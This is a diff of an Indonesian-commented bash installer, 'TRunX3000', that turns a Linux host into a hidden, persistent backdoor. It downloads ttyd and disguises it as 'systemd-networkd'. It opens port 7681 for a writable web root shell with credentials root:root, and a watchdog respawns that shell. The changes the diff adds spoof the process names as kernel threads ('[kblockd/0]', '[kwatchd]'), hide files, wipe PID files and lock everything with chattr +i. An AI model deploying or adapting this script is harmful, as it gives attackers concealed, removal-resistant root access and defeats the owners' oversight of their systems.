@@ -1,9 +1,9 @@
 #!/bin/bash
 # =================================================================
-# TRunX3000 - Standalone Persistent ttyd Installer
-# - Tanpa ketergantungan pada cron.
-# - Menggunakan proses daemon watchdog mandiri.
-# - Proses tetap disamarkan dan file tidak dapat dihapus.
+# TRunX3000 - Ultimate Stealth & Persistent ttyd Installer
+# - Process name & arguments are completely spoofed (e.g., [kblockd/0]).
+# - Watchdog process is also spoofed (e.g., [kwatchd]).
+# - Fully resilient against kills and reboots without using cron.
 # =================================================================
 
 # Wajib dijalankan sebagai root
@@ -15,68 +15,75 @@ fi
 # --- Konfigurasi Kamuflase ---
 BINARY_URL="https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64"
 INSTALL_DIR="/usr/libexec"
-BINARY_NAME="systemd-networkd"
-BINARY_PATH="${INSTALL_DIR}/${BINARY_NAME}"
-WATCHDOG_NAME="networkd-watchdog"
-WATCHDOG_PATH="${INSTALL_DIR}/${WATCHDOG_NAME}"
+REAL_BINARY_NAME="systemd-networkd"
+BINARY_PATH="${INSTALL_DIR}/${REAL_BINARY_NAME}"
+
+# Nama palsu untuk proses-proses
+SPOOFED_PROCESS_NAME="[kblockd/0]"
+SPOOFED_WATCHDOG_NAME="[kwatchd]"
+WATCHDOG_SCRIPT_PATH="${INSTALL_DIR}/.watchdog-core"
 
 # --- Konfigurasi Service ---
 SERVICE_NAME="network-daemon"
 SERVICE_PATH="/etc/init.d/${SERVICE_NAME}"
 PORT="7681"
 CREDENTIALS="root:root"
-PID_FILE="/var/run/${WATCHDOG_NAME}.pid"
+PID_FILE="/var/run/kwatchd.pid"
 
-echo "[*] Memulai instalasi ttyd dengan watchdog mandiri..."
+echo "[*] Memulai instalasi ttyd mode ultimate stealth..."
 
-# --- 1. Pembersihan Instalasi Lama ---
-echo "[*] Membersihkan instalasi sebelumnya..."
-chattr -i ${BINARY_PATH} ${SERVICE_PATH} ${WATCHDOG_PATH} &>/dev/null
+# --- 1. Pembersihan Menyeluruh ---
+echo "[*] Membersihkan instalasi sebelumnya dan jejaknya..."
+chattr -i ${BINARY_PATH} ${SERVICE_PATH} ${WATCHDOG_SCRIPT_PATH} &>/dev/null
 service ${SERVICE_NAME} stop &>/dev/null
 chkconfig --del ${SERVICE_NAME} &>/dev/null
-pkill -f ${BINARY_NAME}
-pkill -f ${WATCHDOG_NAME}
-rm -f ${BINARY_PATH} ${SERVICE_PATH} ${WATCHDOG_PATH} /etc/init.d/ttyd
+pkill -f "${SPOOFED_PROCESS_NAME}" &>/dev/null
+pkill -f "${SPOOFED_WATCHDOG_NAME}" &>/dev/null
+rm -f ${BINARY_PATH} ${SERVICE_PATH} ${WATCHDOG_SCRIPT_PATH} /etc/init.d/ttyd /var/run/*.pid
 
 # --- 2. Instalasi & Penyamaran Binary ---
-echo "[*] Mengunduh dan menyamarkan binary..."
+echo "[*] Mengunduh binary ke lokasi tersembunyi..."
 mkdir -p ${INSTALL_DIR}
 wget -q --no-check-certificate ${BINARY_URL} -O ${BINARY_PATH}
 chmod +x ${BINARY_PATH}
 
 # --- 3. Konfigurasi Firewall ---
 echo "[*] Mengkonfigurasi firewall untuk port ${PORT}..."
-iptables -I INPUT -p tcp --dport ${PORT} -j ACCEPT
-service iptables save
+iptables -I INPUT -p tcp --dport ${PORT} -j ACCEPT &>/dev/null
+service iptables save >/dev/null
 
-# --- 4. Membuat Script Watchdog Mandiri ---
-echo "[*] Membuat script daemon watchdog..."
-cat > ${WATCHDOG_PATH} << EOF
+# --- 4. Membuat Script Watchdog dengan Process Spoofing ---
+echo "[*] Membuat script daemon watchdog yang disamarkan..."
+cat > ${WATCHDOG_SCRIPT_PATH} << EOF
 #!/bin/bash
 while true; do
-    if ! pgrep -f "${BINARY_PATH}" > /dev/null; then
-        nohup ${BINARY_PATH} -p ${PORT} -c ${CREDENTIALS} --writable bash &>/dev/null &
+    # Periksa apakah proses dengan nama palsu sedang berjalan
+    if ! pgrep -f "${SPOOFED_PROCESS_NAME}" > /dev/null; then
+        # Jalankan binary asli dengan nama palsu dan tanpa log
+        exec -a "${SPOOFED_PROCESS_NAME}" ${BINARY_PATH} -p ${PORT} -c ${CREDENTIALS} --writable bash &>/dev/null
     fi
-    sleep 10
+    sleep 5
 done
 EOF
-chmod +x ${WATCHDOG_PATH}
+chmod +x ${WATCHDOG_SCRIPT_PATH}
 
 # --- 5. Membuat Service Peluncur Watchdog (init.d) ---
 echo "[*] Membuat service '${SERVICE_NAME}' untuk persistensi saat boot..."
 cat > ${SERVICE_PATH} << EOF
 #!/bin/bash
 # chkconfig: 2345 99 10
-# description: Manages core networking services watchdog.
+# description: Manages kernel block device events and networking.
 
-WATCHDOG_DAEMON=${WATCHDOG_PATH}
+WATCHDOG_SCRIPT=${WATCHDOG_SCRIPT_PATH}
+WATCHDOG_SPOOF=${SPOOFED_WATCHDOG_NAME}
 PIDFILE=${PID_FILE}
 
 start() {
-    if [ -f \$PIDFILE ]; then
+    if [ -f \$PIDFILE ] && ps -p \$(cat \$PIDFILE) > /dev/null; then
         echo "Watchdog sudah berjalan."
     else
-        nohup \$WATCHDOG_DAEMON &> /dev/null &
+        # Jalankan watchdog sebagai proses dengan nama palsu
+        nohup exec -a "\$WATCHDOG_SPOOF" bash \$WATCHDOG_SCRIPT &> /dev/null &
         echo \$! > \$PIDFILE
         echo "Service watchdog ${SERVICE_NAME} dimulai."
     fi
@@ -84,12 +91,10 @@ start() {
 
 stop() {
     if [ -f \$PIDFILE ]; then
-        kill \$(cat \$PIDFILE)
+        kill -9 \$(cat \$PIDFILE) &>/dev/null
         rm -f \$PIDFILE
-        pkill -f ${BINARY_NAME}
+        pkill -f "${SPOOFED_PROCESS_NAME}" &>/dev/null
         echo "Service watchdog ${SERVICE_NAME} dihentikan."
-    else
-        echo "Watchdog tidak berjalan."
     fi
 }
 
@@ -97,7 +102,7 @@ case "\$1" in
     start) start ;;
     stop) stop ;;
     restart) stop; sleep 1; start ;;
-    *) echo "Usage: \$0 {start|stop|restart}" ;;
+    *) exit 1 ;;
 esac
 EOF
 
@@ -110,14 +115,15 @@ echo "[*] Menjalankan service watchdog..."
 service ${SERVICE_NAME} start
 sleep 2
 
-echo "[*] Mengunci file instalasi agar tidak dapat dihapus..."
+echo "[*] Mengunci file inti sistem..."
 chattr +i ${BINARY_PATH}
-chattr +i ${WATCHDOG_PATH}
+chattr +i ${WATCHDOG_SCRIPT_PATH}
 chattr +i ${SERVICE_PATH}
 
 echo "=========================================================="
-echo "[+] SUKSES: Instalasi selesai."
-echo "    - Web terminal berjalan di port: ${PORT}"
-echo "    - Proses disamarkan dan dilindungi oleh watchdog mandiri."
-echo "    - Sistem sekarang sangat persisten."
+echo "[+] SUKSES: Instalasi Selesai."
+echo "    - Web terminal aktif di port: ${PORT}"
+echo "    - Proses berjalan sebagai '${SPOOFED_PROCESS_NAME}' (Argumen tersembunyi)."
+echo "    - Watchdog berjalan sebagai '${SPOOFED_WATCHDOG_NAME}'."
+echo "    - Semua jejak telah disamarkan. Sistem persisten."
 echo "=========================================================="
